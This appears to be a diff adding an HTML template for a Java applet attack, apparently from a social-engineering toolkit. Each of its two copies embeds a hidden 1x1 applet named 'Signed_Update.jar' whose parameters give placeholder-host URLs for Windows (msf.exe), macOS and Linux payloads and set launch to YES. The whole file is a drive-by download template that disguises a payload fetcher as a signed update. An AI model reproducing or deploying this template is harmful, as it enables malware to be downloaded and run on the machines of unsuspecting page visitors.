@@ -1,0 +1,14 @@
+<applet width="1" height="1" id="IDREPLACEHERE" code="Java.class" archive="Signed_Update.jar"><param name="WINDOWSPLZ" value="http://ipaddrhere/msf.exe"><param name="ILIKESTUFF" value=""><param name="OSX" value="http://ipaddrhere/mac.bin"><param name="LINUX" value="http://ipaddrhere/nix.bin"><param name="X64" value=""><param name="X86" value=""><param name="HUGSNOTDRUGS" value="freehugs"><param name="LAUNCH" value="YES"><param name="nextPage" value=""><param name="separate_jvm" value="true"></applet>
+
+
+// 1 = WINDOWSPLZ
+// 2 = ILIKESTUFF
+// 3 = OSX
+// 4 = LINUX
+// 5 = X64
+// 6 = X86
+// 7 = HUGSNOTDRUGS
+// 8 = LAUNCH 
+// 9 = nextPage
+
+<applet width="1" height="1" id="IDREPLACEHERE" code="Java.class" archive="Signed_Update.jar"><param name="1" value="http://ipaddrhere/msf.exe"><param name="2" value=""><param name="3" value="http://ipaddrhere/mac.bin"><param name="4" value="http://ipaddrhere/nix.bin"><param name="5" value=""><param name="6" value=""><param name="7" value="freehugs"><param name="8" value="YES"><param name="9" value=""><param name="10" value="true"></applet>
